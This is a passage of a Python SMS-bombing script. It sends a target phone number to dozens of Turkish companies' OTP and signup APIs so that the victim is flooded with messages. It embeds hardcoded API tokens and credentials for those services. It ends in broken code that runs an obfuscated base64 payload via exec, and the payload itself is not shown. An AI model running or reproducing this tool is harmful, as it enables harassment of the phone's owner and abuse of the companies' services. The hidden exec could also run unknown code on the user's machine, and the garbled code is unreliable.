            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.komagene.com.tr")

    # kuryemgelsin.com
    def KuryemGelsin(self):
        try:
            url = "https://api.kuryemgelsin.com:443/en/api/users/registerMessage/"
            json = {"phoneNumber": self.phone, "phone_country_code": "+90"}
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.kuryemgelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.kuryemgelsin.com")

    # porty.tech
    def Porty(self):
        try:
            url = "https://panel.porty.tech:443/api.php?"
            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8",
                       "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9",
                       "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0",
                       "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
            json = {"job": "start_login", "phone": self.phone}
            r = requests.post(url=url, json=json, headers=headers)
            if r.json()["status"] == "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> panel.porty.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> panel.porty.tech")

    # taksim.digital
    def Taksim(self):
        try:
            url = "https://service.taksim.digital/services/PassengerRegister/Register"
            json = {"countryPhoneCode": "+90", "phoneNo": self.phone}
            r = requests.post(url=url, json=json)
            if r.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> service.taksim.digital")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> service.taksim.digital")

    # vakiftasdelensu.com
    def Tasdelen(self):
        try:
            url = "http://94.102.66.162:80/MobilServis/api/MobilOperation/CustomerPhoneSmsSend"
            json = {"PhoneNumber": self.phone, "user": {"Password": "Aa123!35@1", "UserName": "MobilOperator"}}
            r = requests.post(url=url, json=json)
            if r.json()["Result"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 94.102.66.162:80")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 94.102.66.162:80")

    # tasimacim.com
    def Tasimacim(self):
        try:
            url = "https://server.tasimacim.com/requestcode"
            json = {"phone": self.phone, "lang": "tr"}
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                ##laskdfşlaskfgşalskfşalsdklgalsgkalişsfasdasd
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> server.tasimacim.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> server.tasimacim.com")

    ##asgjalksfjalkwfkalşsfşaswdaswfa
    # toptanteslim.com
    def ToptanTeslim(self):
        try:
            url = "https://tt.etic.com.tr:443/api/setCustomer"
            headers = {
                "authorization": "Basic dG9wdGFudGVzbGltOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm"}
            data = {"telephone": f"0{self.phone}", "name": "Memati", "surname": "Bas", "email": self.mail,
                    "password": "313131", "password_confirmation": "313131"}
            r = requests.post(url=url, data=data, headers=headers)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> tt.etic.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> tt.etic.com.tr")

    # unilever.com.tr
    def Unilever(self):
        try:
            url = "https://www.siparisdirekt.com/customer/otp/sendotp"
            data = {"mobile": self.phone, "prefix": "+90"}
            headers = {"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                       "x-requested-with": "XMLHttpRequest"}
            r = requests.post(url=url, headers=headers, data=data)
            if r.json()["status"] == 1:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> siparisdirekt.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> siparisdirekt.com")

    ##kasjdlkajfglkawkjdlakwkflkşaskf

    ##amk düdü seni

    ##askjdalkfgkjaşlkswdjkaşsfkasişflkasşfşa

    # uysalmarket.com.tr
    def Uysal(self):
        try:
            url = "https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms"
            json = {"phone_number": self.phone}
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.uysalmarket.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.uysalmarket.com.tr")

    # yapp.com.tr
    def Yapp(self):
        try:
            url = "https://yapp.com.tr:443/api/mobile/v1/register"
            json = {"app_version": "1.1.2", "code": "tr", "device_model": "iPhone9,4", "device_name": "",
                    "device_type": "I", "device_version": "15.7.8", "email": self.mail, "firstname": "Memati",
                    "is_allow_to_communication": "1", "language_id": "1", "lastname": "Bas", "phone_number": self.phone,
                    "sms_code": ""}
            r = requests.post(url=url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yapp.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yapp.com.tr")

    # yilmazticaret.net
    def YilmazTicaret(self):
        try:
            url = "http://www.yilmazticaret.net:80/restapi2/register/"
            headers = {"Authorization": "Basic eWlsbWF6OnlpbG1hejIwMTkqKg=="}
            data = {"telefon": (None, f"0 {self.phone}"), "token": (None, "ExponentPushToken[eWJjFaN_bhjAAbN_rxUIlp]")}
            r = requests.post(url, headers=headers, data=data)
            if r.json()["giris"] == "success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yilmazticaret.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yilmazticaret.net")

    # yuffi.co
    def Yuffi(self):
        try:
            url = "https://api.yuffi.co/api/parent/login/user"
            json = {"phone": self.phone, "kvkk": True}
            r = requests.post(url, json=json)
            if r.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yuffi.co")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")

    # beefull.com
    def Beefull(self):
        try:
            url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
            json = {"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas",
                    "password": "123456", "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull",
                    "username": self.mail}
            requests.post(url, json=json)
            url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
            json = {"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
            r = requests.post(url, json=json)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.beefull.io")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.beefull.io")

    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {
                "Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi",
                "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*",
                "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest",
                "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate",
                "X-App-Device": "ios", "Referer": "https://www.evidea.com/",
                "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0",
                "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data)
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com")

    def N11(self):
        try:
            url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"
            headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*",
                       "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F",
                       "Clientversion": "163", "Accept-Encoding": "gzip, deflate",
                       "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9",
                       "Connection": "close"}
            json = {"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS",
                    "countryCode": "+90", "email": self.mail, "gsmNumber": self.phone, "userType": "BUYER"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["isSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.n11.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.n11.com")

    # tazi.tech
    def Tazi(self):
        try:
            url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8",
                       "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0",
                       "Accept-Language": "tr-TR,tr;q=0.9",
                       "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
            json = {"cep_tel": self.phone, "cep_tel_ulkekod": "90"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["kod"]) == "0000":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech")

    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp",
                              json={"msisdn": f"90{self.phone}"})
            if r.status_code == 200:
                print(
                    f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else:
                raise
        except:
            print(
                f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")

    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                       "Accept-Encoding": "gzip, deflate",
                       "Mobillium-Device-Id": "56DB9AC4-F52B-4DF1-B14C-E39690BC69FC",
                       "User-Agent": "suiste/1.6.16 (com.mobillium.suiste; build:1434; iOS 15.7.7) Alamofire/5.6.4",
                       "Accept-Language": "en"}
            data = {"action": "register", "gsm": self.phone}
            r = requests.post(url, headers=headers, data=data)
            ##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdk#ıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkai#sflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##l#alşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkı#aşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflasasgfasdşlaislaaslgkjaşlkalşsgkaşlskasşldkasçlgkas
            ##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflas##lalşsdkıaşlsfkaisflasasjflkasjf##lalşsdkıaşlsfkaisflasajksdşga##lalşsdkıaşlsfkaisflasş

            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")

    # bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone": self.phone})
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")

    # icq.net
    def Icq(self):
        try:
            url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{self.phone}&platform=ios&r=796356153&smsFormatType=human"
            headers = {"Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded",
                       "User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4",
                       "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
            r = requests.post(url, headers=headers)
            if r.json()["response"]["statusCode"] == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net")

    # evidea.co

    # marti.tech
    def Marti(self):
        try:
            url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin"
            json = {"mobilePhone": self.phone, "mobilePhoneCountryCode": "90", "oneSignalId": ""}
            r = requests.post(url, json=json)
            if r.json()["isSuccess"] == True:
                print(
                    f"{Fore.LIGHTGREEN_EX}  [+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}  [-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")

    # tiklagelsin.com
    def TiklaGelsin(self):
        try:
            url = "https://svc.apps.tiklagelsin.com:443/user/graphql"
            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*",
                       "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate",
                       "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0",
                       "X-Device-Type": "2"}
            json = {"operationName": "GENERATE_OTP",
                    "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n",
                    "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68",
                                  "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB",
                                  "phone": f"+90{self.phone}"}}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}  [+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}  [-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")

    # tasimacim.com

    # yuffi.co
    def Yuffi(self):
        try:
            url = "https://api.yuffi.co/api/parent/login/user"
            json = {"phone": self.phone, "kvkk": True}
            r = requests.post(url, json=json)
            if r.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}  [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.yuffi.co")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}  [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")

    # getir
    def getir(self):
        try:
            url = "https://getir.com/"
            json = {"countryCode": "90", "gsm": self.phone}
            wmf = requests.post(url, json=json)
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}  [+] {Style.RESET_ALL}Başarılı! {self.phone} --> getir.com")
                self.adet += 1
            else:
                raise
        except:

            print(f"{Fore.LIGHTRED_EX}  [-] {Style.RESET_ALL}Başarısız! {self.phone} -"
exec(base64.b64decode(siktirgit).decode('utf-8'))
